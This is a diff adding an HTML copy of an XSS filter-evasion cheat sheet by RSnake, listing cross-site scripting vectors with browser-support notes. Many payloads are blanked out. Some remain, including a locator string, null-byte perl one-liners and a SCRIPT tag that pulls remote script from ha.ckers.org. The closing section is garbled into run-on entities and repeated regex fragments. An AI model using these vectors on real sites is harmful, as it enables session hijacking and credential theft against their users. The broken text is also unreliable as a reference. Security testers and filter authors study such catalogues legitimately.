@@ -1,0 +1,243 @@
+<div><pre>
+XSS (Cross Site Scripting) Cheat Sheet
+Esp: for filter evasion
+
+By RSnake
+
+Note from the author: XSS is Cross Site Scripting. If you don't know how XSS 
+(Cross Site Scripting) works, this page probably won't help you. This page is 
+for people who already understand the basics of XSS attacks but want a deep 
+understanding of the nuances regarding filter evasion. This page will also not 
+show you how to mitigate XSS vectors or how to write the actual 
+cookie/credential stealing/replay/session riding portion of the attack. It will 
+simply show the underlying methodology and you can infer the rest. Also, please 
+note my XSS page has been replicated by the OWASP 2.0 Guide in the Appendix 
+section with my permission. However, because this is a living document I 
+suggest you continue to use this site to stay up to date.
+
+Also, please note that most of these cross site scripting vectors have been 
+tested in the browsers listed at the bottom of the page, however, if you have 
+specific concerns about outdated or obscure versions please download them from 
+Evolt. Please see the XML format of the XSS Cheat Sheet if you intend to use 
+CAL9000 or other automated tools. If you have an RSS reader feel free to 
+subscribe to the Web Application Security RSS feed below, or join the forum:
+
+Web Application Security RSS feed
+
+
+XSS (Cross Site Scripting):
+
+      XSS locator. Inject this string, and in most cases where a script is 
+vulnerable with no special XSS vector requirements the word "XSS" will pop up. 
+Use the URL encoding calculator below to encode the entire string. Tip: if 
+you're in a rush and need to quickly check a page, often times injecting the 
+depreciated "" tag will be enough to check to see if something is 
+vulnerable to XSS by messing up the output appreciably:
+      
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))/
+/";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))
+//-->">'>
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      XSS locator 2. If you don't have much space and know there is no 
+vulnerable JavaScript on the page, this string is a nice compact XSS injection 
+check. View source after injecting it and look for =&amp;{()}
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      No filter evasion. This is a normal XSS JavaScript injection, and most 
+likely to get caught but I suggest trying it first (the quotes are not required 
+in any modern browser so they are omitted here):
+      
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Image XSS using the JavaScript directive (IE7.0 doesn't support the 
+JavaScript directive in context of an image, but it does in other contexts, but 
+the following show the principles that would work in other tags as well - I'll 
+probably revise this at a later date):
+      
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      No quotes and no semicolon:
+      
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Case insensitive XSS attack vector:
+      
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      HTML entities (the semicolons are required for this to work):
+      
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Grave accent obfuscation (If you need to use both double and single 
+quotes you can use a grave accent to encapsulate the JavaScript string - this 
+is also useful because lots of cross site scripting filters don't know about 
+grave accents):
+      
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Malformed IMG tags. Originally found by Begeek (but cleaned up and 
+shortened to work in all browsers), this XSS vector uses the relaxed rendering 
+engine to create our XSS vector within an IMG tag that should be encapsulated 
+within quotes. I assume this was originally meant to correct sloppy coding. 
+This would make it significantly more difficult to correctly parse apart an 
+HTML tag:
+      ">
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      fromCharCode (if no quotes of any kind are allowed you can eval() a 
+fromCharCode in JavaScript to create any XSS vector you need). Click here to 
+build your own (thanks to Hannes Leopold):
+      
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      UTF-8 Unicode encoding (all of the XSS examples that use a javascript: 
+directive inside of an 
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Long UTF-8 Unicode encoding without semicolons (this is often effective 
+in XSS that attempts to look for "&amp;#XX;", since most people don't know about 
+padding - up to 7 numeric characters total). This is also useful against people 
+who decode against strings like $tmp_string =~ s/.*\&amp;#(\d+);.*/$1/; which 
+incorrectly assumes a semicolon is required to terminate a html encoded string 
+(I've seen this in the wild):
+      
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Hex encoding without semicolons (this is also a viable XSS attack against 
+the above string $tmp_string =~ s/.*\&amp;#(\d+);.*/$1/; which assumes that there 
+is a numeric character following the pound symbol - which is not true with hex 
+HTML characters). Use the XSS calculator for more information:
+      
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Embedded tab to break up the cross site scripting attack: 
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Embedded encoded tab to break up XSS:
+      
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Embeded newline to break up XSS. Some websites claim that any of the 
+chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 
+(horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii 
+chart for more details. The following four XSS examples illustrate this vector:
+      
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Embedded carriage return to break up XSS (Note: with the above I am 
+making these strings longer than they have to be because the zeros could be 
+omitted. Often I've seen filters that assume the hex and dec encoding has to be 
+two or three characters. The real rule is 1-7 characters.):
+      
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Multiline Injected JavaScript using ASCII carriage returns (same as above 
+only a more extreme example of this XSS vector) these are not spaces just one 
+of the three characters as described above:
+      
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Null breaks up JavaScript directive. Okay, I lied, null chars also work 
+as XSS vectors but not like above, you need to inject them directly using 
+something like Burp Proxy or use %00 in the URL string or if you want to write 
+your own injection tool you can either use vim (^V^@ will produce a null) or 
+the following program to generate it into a text file. Okay, I lied again, 
+older versions of Opera (circa 7.11 on Windows) were vulnerable to one 
+additional char 173 (the soft hypen control char). But the null char %00 is 
+much more useful and helped me bypass certain real world filters with a 
+variation on this example:
+      perl -e 'print "";' > out
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Null breaks up cross site scripting vector. Here is a little known XSS 
+attack vector using null characters. You can actually break up the HTML itself 
+using the same nulls as shown above. I've seen this vector bypass some of the 
+most restrictive XSS filters to date:
+      perl -e 'print "&lt;SCR\0IPT&gt;alert(\"XSS\")&lt;/SCR\0IPT&gt;";' > out
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Spaces and meta chars before the JavaScript in images for XSS (this is 
+useful if the pattern match doesn't take into account spaces in the word 
+"javascript:" -which is correct since that won't render- and makes the false 
+assumption that you can't have a space between the quote and the "javascript:" 
+keyword. The actual reality is you can have any char from 1-32 in decimal):
+      
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Non-alpha-non-digit XSS. While I was reading the Firefox HTML parser I 
+found that it assumes a non-alpha-non-digit is not valid after an HTML keyword 
+and therefor considers it to be a whitespace or non-valid token after an HTML 
+tag. The problem is that some XSS filters assume that the tag they are looking 
+for is broken up by whitespace. For example "&lt;SCRIPT\s&quot; != &quot;&lt;SCRIPT/XSS\s&quot;:
+      &lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Non-alpha-non-digit part 2 XSS. yawnmoth brought my attention to this 
+vector, based on the same idea as above, however, I expanded on it, using my 
+fuzzer. The Gecko rendering engine allows for any character other than letters, 
+numbers or encapsulation chars (like quotes, angle brackets, etc...) between 
+the event handler and the equals sign, making it easier to bypass cross site 
+scripting blocks. Note that this also applies to the grave accent char as seen 
+here:
+      
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Non-alpha-non-digit part 3 XSS. Yair Amit brought this to my attention 
+that there is slightly different behavior between the IE and Gecko rendering 
+engines that allows just a slash between the tag and the parameter with no 
+spaces. This could be useful if the system does not allow spaces.
+      
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      Extraneous open brackets. Submitted by Franz Sedlmaier, this XSS vector 
+could defeat certain detection engines that work by first using matching pairs 
+of open and close angle brackets and then by doing a comparison of the tag 
+inside, instead of a more efficient algorythm like Boyer-Moore that looks for 
+entire string matches of the open angle bracket and associated tag (post 
+de-obfuscation, of course). The double slash comments out the ending extraneous 
+bracket to supress a JavaScript error:
+      &lt;&lt;
+      Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
+
+
+      No closing script tags. In Firefox and Netscape 8.1 in the Gecko 
+rendering engine mode you don't actually need the ">" portion of this 
+Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag 
+and add closing tags for you. How thoughtful! Unlike the next one, which 
+doesn't effect Firefox, this does not require any additional HTML below it. You 
+can add quotes if you need to, but they're not needed generally, although 
+beware, I have no idea what the HTML will end up looking like once this is 
+injected:
+       tag at the end. However, 
+this is especially useful where space is an issue, and of course, the shorter 
+your domain, the better. The ".j" is valid, regardless of the encoding type 
+because the browser knows it in context of a SCRIPT tag.
+      &lt;&lt;SCRIPT...&quot; to accomplish the XSS attack). Dan 
+Crowley additionally noted that you can put a space before the equals sign 
+(&quot;onload=&quot; != &quot;onload =&quot;):
+      &lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt;&amp;&amp;&lt;script((\s+\w+(\s*=\s*(?:&quot;(.)*?&quot;|&#39;(.)*?&#39;|[^&#39;&quot;&gt;&lt;script((\s+\w+(\s*=\s*(?:&quot;(.)*?&quot;|&#39;(.)*?&#39;|[^&#39;&quot;&gt;&lt;script((\s+\w+(\s*=\s*(?:&quot;(.)*?&quot;|&#39;(.)*?&#39;|[^&#39;&quot;&gt;&lt;SCRI&quot;);&lt;/SCRIPT&gt;&#x26;&#x09;&lt;&lt;&amp;&lt;&amp;&amp;LT;&amp;&amp;&amp;&amp;&amp;&amp;&#60;&#060;&#0060;&#00060;&#000060;&#0000060;&amp;&amp;&amp;&amp;&amp;&amp;&#x3c;&#x03c;&#x003c;&#x0003c;&#x00003c;&#x000003c;&amp;&amp;&amp;&amp;&amp;&amp;&#x3c;&#x03c;&#x003c;&#x0003c;&#x00003c;&#x000003c;&amp;&amp;&amp;&amp;&amp;&amp;&#x3C;&#x03C;&#x003C;&#x0003C;&#x00003C;&#x000003C;&amp;&amp;&amp;&amp;&amp;&amp;&#x3c;&#x03c;&#x003c;&#x0003c;&#x00003c;&#x000003c;</pre></div>
